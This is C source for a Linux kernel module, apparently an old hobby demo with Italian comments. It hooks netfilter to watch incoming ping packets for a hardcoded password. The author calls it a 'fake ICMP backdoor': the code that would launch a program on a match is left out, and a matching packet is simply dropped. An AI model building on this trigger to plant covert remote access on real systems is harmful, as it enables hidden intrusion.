/* pizzaicmp v0.1.8 - modulo per kernel programmato a puro scopo di divertimento =)
 * 
 * il modulo in questione lo si può definire una falsa icmp backdoor, quello che 
 * fa consiste nell'usare le librerie netfilter per -catturare- pacchetti ICMP
 * una volta ricevuti il modulo controlla che siano di tipo ICMP_ECHO e nel caso
 * questa ipotesi risulti vera, ne controlla il payload che se contenente la password
 * settata va ad aprire un programma prestabilito (qui ne e' usato uno di esempio)..
 * questa e' la prima release pubblica, che si differenzia dalle precedenti soprattutto
 * per l'uso del netfilter, difatti nella prima versione il modulo praticava un hooking 
 * della icmp_rcv(); per finire in righe e righe di inutili istruzioni, e problemi 
 * di compatibilita'.. in quest'ultima versione sono state inoltre aggiunte varie 
 * features per il log dei tentativi ecc..
 * tengo inoltre a precisare che ho programmato questo piccolo lkm per dimostrare in modo 
 * semplice le tante cose rese possibili e semplificate dall'uso del netfilter hooking
 * e non perche' credo abbia una sua utilita' ben precisa.. ad ogni modo i metodi
 * di applicazione sono tanti se ci si spreme un po'..
 * 
 * voglio quindi ringraziare Luca Falavigna per aver corretto la mia vecchia versione del
 * programma, e per l'idea dell'uso del netfilter..
 * testato su Slackware 10.0 con kernel 2.4.26, compilare con: gcc -c pizzaicmp.c
 * (dovrebbe girare anche su kernel 2.6)
 *
 * coded by Evil <evil@mojodo.it> - www.mojodo.it / www.eviltime.com
 */

#ifndef __KERNEL__
  #define __KERNEL__
#endif

#ifndef MODULE
  #define MODULE
#endif

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/icmp.h>
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>

#define PASSWD "passwondering"             // password, set another one please ;)

#define ALERT(fmt,args...) printk(" " fmt, ##args) 
/* this print in dmesg and log also in /var/log/messages */

static struct nf_hook_ops nfhook;

unsigned int hook(unsigned int, struct sk_buff **,
                  const struct net_device *, const struct net_device *out,int (*okfn)(struct sk_buff *));

int init_module() {

  nfhook.hook = hook;                     // handler
  nfhook.hooknum  = NF_IP_PRE_ROUTING;    // this apply the filter before the routing rules
  nfhook.pf       = PF_INET;              // family
  nfhook.priority = NF_IP_PRI_FIRST;      // priority
  nf_register_hook(&nfhook);              // this register the handler
  return 0;

}

void cleanup_module() {

  nf_unregister_hook(&nfhook);

}

unsigned int hook(unsigned int hooknum,struct sk_buff **skb,
                  const struct net_device *in,const struct net_device *out,int (*okfn)(struct sk_buff *)) {

  struct sk_buff *sb = *skb;
  struct icmphdr *icmp;
  char *payload;
  __u32 ippho;
  __u32 banned = sb->nh.iph->daddr; // do not take it seriously..

  if (sb->nh.iph->protocol != IPPROTO_ICMP)	// error checks: the packet is not an icmp packet
      return NF_ACCEPT;

  icmp = (struct icmphdr *)(sb->data + sb->nh.iph->ihl * 4);
  
  if (icmp->type != ICMP_ECHO)			// error checks: the icmp packet is not an ICMP_ECHO
      return NF_ACCEPT;

  ippho   = sb->nh.iph->saddr;
  payload = (char *)((char *)icmp + sizeof(struct icmphdr));	// packet's payload

  if(ippho == banned) {
     // banned host
     ALERT("focus: PIZZA_ICMP banned host: %d.%d.%d.%d\n", NIPQUAD(banned));
     return NF_ACCEPT;
  }

  if(!strncmp(payload,PASSWD,strlen(PASSWD))) {
     // start the program now!
     return NF_DROP;
  }  else {
     ALERT("focus: PIZZA_ICMP unauthorized packet from: %d.%d.%d.%d PAYLOAD IS: %s\n", NIPQUAD(ippho), payload);
     return NF_ACCEPT;
  }
}

MODULE_AUTHOR("Evil <evil@mojodo.it>");
MODULE_DESCRIPTION("pizzaicmp kernel module");
MODULE_LICENSE("GPL");
